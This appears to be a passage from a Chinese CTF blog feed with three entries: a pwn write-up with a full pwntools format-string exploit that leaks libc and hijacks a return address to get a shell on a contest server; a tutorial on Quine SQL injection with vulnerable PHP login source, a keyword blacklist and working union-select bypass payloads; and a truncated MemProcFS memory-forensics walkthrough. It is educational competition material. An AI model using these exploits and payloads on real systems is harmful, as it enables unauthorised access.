avYHTKfZn6Y%2BbSLuwEbgMnftSBqCPefltedjci87iGmMUsjnzBwRUVQtsaMeFtiREiGp8eyfHjiON1iV8SZUjxc62Y5zzVlwf0geBTpISiJ4QbwMmdfXRPSBWAxUGs/ukuI1mZZzTq3n%2BESl7Z09UE5sHAOBQnZTV4jsxI3Mh3cnXg%2BbUUGibNa4uI/211zUWvZr0mScnwj0GRbc%2B5QZF5ZnAE5D33nyhNy8iAemQhBYaJQSzJgs8tcMLgi7igehuAN79gHPHfLteDrJlXPAXMnGgsMKxxoXaR9RE7S2ak1lDSdDxVcb6VwU2/You47Huy/Bk/aQS48I%2BK6L795qpdwoeL6Gf2A/3Qv86eKjAZNxquVez6lFzmncLLWEl2WGH4zR47IeZzATtY%2BnCkoYyqyeJyVK6a67oUAzB0Pf1tXrZ%2BXZGMsZmHocQdABbrxLaSh7zVCeklSaGAf3qYlQolE9kd7AOdEq7eOyyNZSZQRnGvTHsIx%2BvU1MIt62jGB5Gou9cwz7zcAjPrm9OqUMR3IIgj8qZdFjzzJ8oUcHifK1BOaB7lo2TmCZchd9yrm%2BikNFTAAAAAAAAAAAIF37vXZVAAAAAP6mHjYAAAEAAAAAAAAAoDI46WZ/"></a><br><img src="/mdimg/qwb2023/12.png"></p><h3 id="F-ez-fmt-解题人"><a href="#F-ez-fmt-解题人" class="headerlink" title="F | ez_fmt | 解题人"></a>F | ez_fmt | 解题人</h3><h4 id="题目说明-3"><a href="#题目说明-3" class="headerlink" title="题目说明"></a>题目说明</h4><p>格式化字符串漏洞</p><h4 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="/mdimg/qwb2023/13.png"><br>gift会泄露栈顶地址，动调可以算出ret参数的地址<br>格式化字符串漏洞任意地址写，可以劫持返回地址，利用printf函数泄露libc地址<br>给了libc文件，直接尝试打one_gadget<br><img src="/mdimg/qwb2023/14.png"><br>第二个成功<br>（onegadget地址计算没分情况，概率出)</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">from</span> pwn import *<br><span class="hljs-selector-tag">from</span> pwn import p64<br>def debug():<br>    gdb.<span class="hljs-built_in">attach</span>(r)<br>    <span class="hljs-built_in">pause</span>()<br><br>r=<span class="hljs-built_in">remote</span>(<span class="hljs-string">&#x27;47.104.24.40&#x27;</span>,<span class="hljs-number">1337</span>)<br>#r=<span class="hljs-built_in">process</span>(<span class="hljs-string">&#x27;./ez_fmt&#x27;</span>)<br>elf=<span class="hljs-built_in">ELF</span>(<span class="hljs-string">&quot;./ez_fmt&quot;</span>)<br>libc=<span class="hljs-built_in">ELF</span>(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br><span class="hljs-built_in">context</span>(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>r.<span class="hljs-built_in">recvuntil</span>(b<span class="hljs-string">&#x27;There is a gift for you &#x27;</span>)<br>stack_rsp=<span class="hljs-built_in">int</span>(r.<span class="hljs-built_in">recv</span>(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><br>#<span class="hljs-built_in">debug</span>()<br>#-----calc addr<br>stack_printf_ret = stack_rsp - <span class="hljs-number">0</span>x8<br>stack_ret = stack_rsp + <span class="hljs-number">0</span>x78<br>stack_printf = stack_rsp + <span class="hljs-number">0</span>x158<br><span class="hljs-built_in">success</span>(<span class="hljs-string">&#x27;stack_rsp: %s&#x27;</span>,<span class="hljs-built_in">hex</span>(stack_rsp))<br><span class="hljs-built_in">success</span>(<span class="hljs-string">&#x27;stack_ret: %s&#x27;</span>,<span class="hljs-built_in">hex</span>(stack_ret))<br><span class="hljs-built_in">success</span>(<span class="hljs-string">&#x27;stack_printf: %s&#x27;</span>,<span class="hljs-built_in">hex</span>(stack_printf))<br><br>ogg1 = <span class="hljs-number">0</span>xe3afe<br>ogg2 = <span class="hljs-number">0</span>xe3b01<br>ogg3 = <span class="hljs-number">0</span>xe3b04<br><br>stack_printf_ret_addr = stack_printf_ret &amp; <span class="hljs-number">0</span>xffff<br><span class="hljs-built_in">success</span>(<span class="hljs-string">&#x27;stack_printf_ret_addr %s&#x27;</span>,<span class="hljs-built_in">hex</span>(stack_printf_ret_addr))<br>#<span class="hljs-built_in">debug</span>()<br>#-----hijack ret_addr&amp;&amp;leak libc_base<br>payload=b<span class="hljs-string">&#x27;%19$p&#x27;</span><br>payload+=b<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>x1205-<span class="hljs-number">6</span>-<span class="hljs-number">8</span>).<span class="hljs-built_in">encode</span>()+b<span class="hljs-string">&#x27;c%10$hn&#x27;</span><br>payload=payload.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">0</span>x20,b<span class="hljs-string">&#x27;a&#x27;</span>)<br>payload+=<span class="hljs-built_in">p64</span>(stack_printf_ret)<br>r.<span class="hljs-built_in">send</span>(payload)<br><br>r.<span class="hljs-built_in">recvuntil</span>(b<span class="hljs-string">&#x27;0x&#x27;</span>)<br><br>libc_base=<span class="hljs-built_in">int</span>(r.<span class="hljs-built_in">recv</span>(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0</span>xf3 - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>one=libc_base+ogg2<br>one1=one&amp;<span class="hljs-number">0</span>xffff<br>one2=(one&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0</span>xffff<br><span class="hljs-built_in">success</span>(<span class="hljs-string">&#x27;libc_base: %s&#x27;</span>,<span class="hljs-built_in">hex</span>(libc_base))<br><br>payload=b<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(one2).<span class="hljs-built_in">encode</span>()+b<span class="hljs-string">&#x27;c%10$hn&#x27;</span><br>payload+=b<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(one1-one2).<span class="hljs-built_in">encode</span>()+b<span class="hljs-string">&#x27;c%11$hn&#x27;</span><br>payload=payload.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">0</span>x20,b<span class="hljs-string">&#x27;a&#x27;</span>)<br>payload+=<span class="hljs-built_in">p64</span>(stack_ret-<span class="hljs-number">0</span>x10+<span class="hljs-number">2</span>)+<span class="hljs-built_in">p64</span>(stack_ret-<span class="hljs-number">0</span>x10)<br>r.<span class="hljs-built_in">send</span>(payload)<br><br>r.<span class="hljs-built_in">interactive</span>()<br></code></pre></td></tr></table></figure><p><img src="/mdimg/qwb2023/15.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Quine注入</title>
    <link href="/2023/12/06/Quine%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/12/06/Quine%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>Quine注入的目的：输入输出一致 绕过限制登录</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">replace</span><span class="hljs-params">()</span></span>函数<br><span class="hljs-function"><span class="hljs-title">replace</span><span class="hljs-params">(a,b,c)</span></span> 把a中的b换成c<br>如 <span class="hljs-built_in">replace</span>(<span class="hljs-string">&#x27;abb&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>) -&gt; acc<br></code></pre></td></tr></table></figure><h3 id="构造quine"><a href="#构造quine" class="headerlink" title="构造quine"></a>构造quine</h3><p>下面是一个基本语句<br><code>select replace(&quot;.&quot;,char(46),&quot;.&quot;);</code><br><img src="/mdimg/quine/1.png"><br>要构造quine，就是套娃<br>下面把基础语句的<br><code>select replace(&quot;.&quot;,char(46),&quot;.&quot;);</code><br>中的<code>&quot;.&quot;</code> 改成基础语句，这里是把基础语句<code>replace(&quot;.&quot;,char(46),&quot;.&quot;)</code>当字符串的意思(为了避免转义，用单引号包裹这个str语句<br><code>select replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;);</code><br>看着很复杂，其实最重要是知道<code>replace</code>作用就是替换字符，<code>replace(&quot;.&quot;,char(46),&quot;.&quot;)</code>是一个字符串！！！！<br>翻译这个语句为人话就是：把 <code>replace(&quot;.&quot;,char(46),&quot;.&quot;) </code>字符串中的<code>.</code>换成<code>replace(&quot;.&quot;,char(46),&quot;.&quot;)</code>字符串<br><img src="/mdimg/quine/2.png"></p><p><img src="/mdimg/quine/3.png"></p><p>仔细看这两个语句，在单引号和双引号这里不一样，但是不可避免的，因为<code>replace(&quot;.&quot;,char(46),&quot;.&quot;)</code>字符串中有双引号，所以把它当作字符串写入replace时要用单引号，不然会报错<br><img src="/mdimg/quine/4.png"><br>当然转义可以解决，但是这样输入输出就更不一样了<br><img src="/mdimg/quine/5.png"><br>要做到输入输出一致，那就要在单双引号里面下功夫了<br><code>双引号 &quot; char(34) </code><br><code>单引号 &quot; char(39)</code></p><h4 id="1-从内向外一层层套"><a href="#1-从内向外一层层套" class="headerlink" title="1.从内向外一层层套"></a>1.从内向外一层层套</h4><p><code>replace(&quot;.&quot;,char(34),char(39)) //返回.</code></p><h4 id="2-再套一层replace"><a href="#2-再套一层replace" class="headerlink" title="2.再套一层replace"></a>2.再套一层replace</h4><p><code>replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;) //返回.</code></p><h4 id="3-试着把上面这个语句的点的双引号改成单引号"><a href="#3-试着把上面这个语句的点的双引号改成单引号" class="headerlink" title="3.试着把上面这个语句的点的双引号改成单引号"></a>3.试着把上面这个语句的点的双引号改成单引号</h4><p><code>select replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39));</code><br><img src="/mdimg/quine/6.png"><br>可以看到上面输入和结果是等价的，但是语句由长变短了<br>那么对于<br><code>replace(replace(&#39;.&#39;,char(34),char(39)),char(46),&#39;.&#39;)</code></p><h4 id="4-就可以进行像一开始那样把点replace改成套娃语句，把上面的语句当成一个字符串"><a href="#4-就可以进行像一开始那样把点replace改成套娃语句，把上面的语句当成一个字符串" class="headerlink" title="4.就可以进行像一开始那样把点replace改成套娃语句，把上面的语句当成一个字符串"></a>4.就可以进行像一开始那样把点replace改成套娃语句，把上面的语句当成一个字符串</h4><p><code>select replace(&quot;replace(replace(&#39;.&#39;,char(34),char(39)),char(46),&#39;.&#39;)&quot;,char(46),&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;);</code><br><img src="/mdimg/quine/7.png"><br><img src="/mdimg/quine/8.png"><br>仔细看替换后的输出<br><code>replace(replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;)</code><br><img src="/mdimg/quine/9.png"><br>和上面3.的由长变短的语句一模一样，并且长短两个语句是等价的，也就是说把短语句改成长语句，就能输入输出一致了<br>最终构造出<br><code>select replace(replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;); </code><br>这个语句实际上执行的结果与下面替换后相同<br><img src="/mdimg/quine/10.png"><br> 这里仔细看，前面要被替换的语句是没加引号的，也就是说语句(上图蓝底)会先被执行，把这个语句的输出(红框内)当字符串</p><h3 id="第五空间-2021-yet-another-mysql-injection"><a href="#第五空间-2021-yet-another-mysql-injection" class="headerlink" title="[第五空间 2021]yet_another_mysql_injection"></a>[第五空间 2021]yet_another_mysql_injection</h3><p>访问<code>/?source</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-keyword">include_once</span>(<span class="hljs-string">&quot;lib.php&quot;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">alertMes</span>(<span class="hljs-params"><span class="hljs-variable">$mes</span>,<span class="hljs-variable">$url</span></span>)</span>&#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;<span class="hljs-subst">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class="hljs-subst">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkSql</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="hljs-variable">$s</span>))&#123;<br>    <span class="hljs-title function_ invoke__">alertMes</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-string">&#x27;index.php&#x27;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>] != <span class="hljs-string">&#x27;&#x27;</span>) &#123;<br>  <span class="hljs-variable">$username</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>  <span class="hljs-variable">$password</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$username</span> !== <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">alertMes</span>(<span class="hljs-string">&#x27;only admin can login&#x27;</span>, <span class="hljs-string">&#x27;index.php&#x27;</span>);<br>  &#125;<br>  <span class="hljs-title function_ invoke__">checkSql</span>(<span class="hljs-variable">$password</span>);<br>  <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;;&quot;</span>;<br>  <span class="hljs-variable">$user_result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql</span>);<br>  <span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$user_result</span>);<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$row</span>) &#123;<br>    <span class="hljs-title function_ invoke__">alertMes</span>(<span class="hljs-string">&quot;something wrong&quot;</span>,<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>] === <span class="hljs-variable">$password</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$FLAG</span>);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">alertMes</span>(<span class="hljs-string">&quot;wrong password&quot;</span>,<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))&#123;<br>  <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>  <span class="hljs-keyword">die</span>;<br>&#125;<br>  <span class="hljs-meta">?&gt;</span><br>  &lt;!-- /?source --&gt;<br>  &lt;html&gt;<br>    &lt;body&gt;<br>      &lt;form action=<span class="hljs-string">&quot;/index.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<br>        &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;username&quot;</span> placeholder=<span class="hljs-string">&quot;账号&quot;</span>&gt;&lt;br/&gt;<br>        &lt;input type=<span class="hljs-string">&quot;password&quot;</span> name=<span class="hljs-string">&quot;password&quot;</span> placeholder=<span class="hljs-string">&quot;密码&quot;</span>&gt;&lt;br/&gt;<br>        &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> / value=<span class="hljs-string">&quot;登录&quot;</span>&gt;<br>      &lt;/form&gt;<br>    &lt;/body&gt;<br>  &lt;/html&gt;<br></code></pre></td></tr></table></figure><p>checkSql方法里<br><code>if ($row[&#39;password&#39;] === $password) &#123; die($FLAG);</code><br>对password强比较<br><code>$password</code>为POST传入<br><code>$row[&#39;password&#39;]</code><br>是 <code> $sql=&quot;SELECT password FROM users WHERE username=&#39;admin&#39; and password=&#39;$password&#39;;&quot;;</code>的查询结果<br>审源码<br>过滤了空格<br>这题可以盲注，但注出来的密码无法登录<br>这就要用到quine注入<br>本地构造一个表<br><img src="/mdimg/quine/11.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> passwd <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">and</span> passwd<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;password&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="/mdimg/quine/a.png"></p><p>这里使用union是为了组成新表，让查询返回的是我们输入的值而不是原先表的内容</p><p>据此，可以构造payload</p><p>一个基本语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#<br></code></pre></td></tr></table></figure><p>仔细看，与最上面的基础语句相比只是多了<code>1&quot; union select</code>      +末尾的注释</p><p>替换掉上面已经构造好的基本语句即可</p><p><img src="/mdimg/quine/b.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">replace(replace(<span class="hljs-string">&#x27;1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;</span>,<span class="hljs-type">char</span>(<span class="hljs-number">34</span>),<span class="hljs-type">char</span>(<span class="hljs-number">39</span>)),<span class="hljs-type">char</span>(<span class="hljs-number">46</span>),<span class="hljs-string">&#x27;1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;</span>)<br></code></pre></td></tr></table></figure><p><code>用/**/绕过空格 （前面的1&#39;/**/union/**/select/**/ 的功能是拼接语句加构造新表</code></p><p>根据第20行sql语句 将payload语句直接替换题目的sql语句的<code>$password</code><br><code>SELECT passwd FROM test WHERE username=&#39;admin&#39; and passwd=&#39;1&#39;/**/union/**/select/**/replace(replace(&#39;1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;,char(34),char(39)),char(46),&#39;1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;)#&#39;;</code><br><img src="/mdimg/quine/12.png"><br>输入输出一致，<code>if ($row[&#39;password&#39;] === $password)</code>返回<code>true</code> 绕过了密码登录<br>最终payload<br><code>username=admin&amp;password=1&#39;/**/union/**/select/**/replace(replace(&#39;1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;,char(34),char(39)),char(46),&#39;1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;)#</code></p><h3 id="HDCTF-2023-LoginMaster"><a href="#HDCTF-2023-LoginMaster" class="headerlink" title="[HDCTF 2023]LoginMaster"></a>[HDCTF 2023]LoginMaster</h3><p>/robots.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkSql</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="hljs-variable">$s</span>))&#123;<br>        <span class="hljs-title function_ invoke__">alertMes</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-string">&#x27;index.php&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>] === <span class="hljs-variable">$password</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable">$FLAG</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">alertMes</span>(<span class="hljs-string">&quot;wrong password&quot;</span>,<span class="hljs-string">&#x27;index.php&#x27;</span>);<br></code></pre></td></tr></table></figure><p>和上面一题源码几乎一样</p><p>post</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/union/**/select/**/replace(replace(&#x27;</span><span class="hljs-number">1</span>&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;1&quot;<span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>replace(replace(&quot;.&quot;,<span class="hljs-type">char</span>(<span class="hljs-number">34</span>),<span class="hljs-type">char</span>(<span class="hljs-number">39</span>)),<span class="hljs-type">char</span>(<span class="hljs-number">46</span>),&quot;.&quot;)#<span class="hljs-string">&#x27;)#</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MemProcFS 内存取证</title>
    <link href="/2023/12/05/MemProcFS%E4%BD%BF%E7%94%A8/"/>
    <url>/2023/12/05/MemProcFS%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>ok啊，kali没内存了，vol用不上<br>刚好接触新工具MemProcFS，很直观能看到各种文件，不用记命令<br>但是第一次用不太熟，也没看到啥文章，一个个横冲直撞的找文件很煎熬<br>注册表这种也是看不懂<br>道阻且长</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><code>pip install leechcorepyc</code><br><a href="https://github.com/ufrisk/MemProcFS/releases">https://github.com/ufrisk/MemProcFS/releases</a><br>安装最新版本<br>解压即可食用</p><h2 id="某医疗行业赛取证"><a href="#某医疗行业赛取证" class="headerlink" title="某医疗行业赛取证"></a>某医疗行业赛取证</h2><h3 id="鱼叉攻击场景溯源-1"><a href="#鱼叉攻击场景溯源-1" class="headerlink" title="鱼叉攻击场景溯源_1"></a>鱼叉攻击场景溯源_1</h3><p>题目内容：<br>某医院门诊挂号系统遭遇钓鱼攻击，系统内被植入木马程序，现请你对该场景下受灾系统进行分析溯源并回答如下问题。<br>（本题附件名：yuchagongji.7z）<br>请分析受灾系统的主机基本信息（答案格式为flag{系统主机名+系统用户名+系统用户SID+操作系统构建build编号+主机网卡的固定IP地址的md5值}<br>例如：系统主机名为weiruan，系统用户名为user1，系统用户SID为S-1-4-18-3218096128-1257898252-2035427519-1003，操作系统构建build编号为20230，主机网卡的固定IP地址为192.168.20.23，flag即为flag{md5(weiruan+user1+S-1-4-18-3218096128-1257898252-2035427519-1003+20230+192.168.20.23)}即flag{41e10eec498a50be9591c8e641aafcf3}<br><code>.\MemProcFS.exe -device \Desktop\forensic.raw -forensic 0</code> （相关命令可以参考<a href="https://github.com/ufrisk/MemProcFS/wiki/_CommandLine">https://github.com/ufrisk/MemProcFS/wiki/_CommandLine</a><br><img src="/mdimg/memprocfs/1.png"><br>此时这个工具给我们生成了一个虚拟磁盘（默认是M 如果M已经存在，加上-mount Z 指定别名<br><img src="/mdimg/memprocfs/2.png"><br>在sys目录下存放了系统相关信息<br><img src="/mdimg/memprocfs/3.png"><br>在sys目录下可以得到以下信息</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">系统主机名             CORE-<span class="hljs-number">2023</span><br>系统用户名                           H_admin     <span class="hljs-regexp">//</span> 在sys<span class="hljs-regexp">/users/</span><br>系统用户SID             S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3114095118</span>-<span class="hljs-number">2402888954</span>-<span class="hljs-number">2065529513</span>-<span class="hljs-number">1001</span>    <span class="hljs-regexp">//</span> 在sys<span class="hljs-regexp">/users/</span><br>操作系统构建build编号     <span class="hljs-number">22621</span><br></code></pre></td></tr></table></figure><p><code>sys/net</code>目录下存放了服务及网卡监听端口信息，里面有本机ip<br><img src="/mdimg/memprocfs/4.png"><br><code>192.168.52.130</code><br>flag<br><code>CORE-2023+H_admin+S-1-5-21-3114095118-2402888954-2065529513-1001+22621+192.168.52.130 ``flag&#123;e2e33285c9d60df458717e45c3bcfe01&#125; </code></p><h3 id="鱼叉攻击场景溯源-2"><a href="#鱼叉攻击场景溯源-2" class="headerlink" title="鱼叉攻击场景溯源_2"></a>鱼叉攻击场景溯源_2</h3><p>题目内容：<br>遭受钓鱼攻击的不当操作源头网络信息为（答案格式为flag{钓鱼攻击使用网站标题+钓鱼攻击使用的恶意程序http下载链接的md5值，例如<a 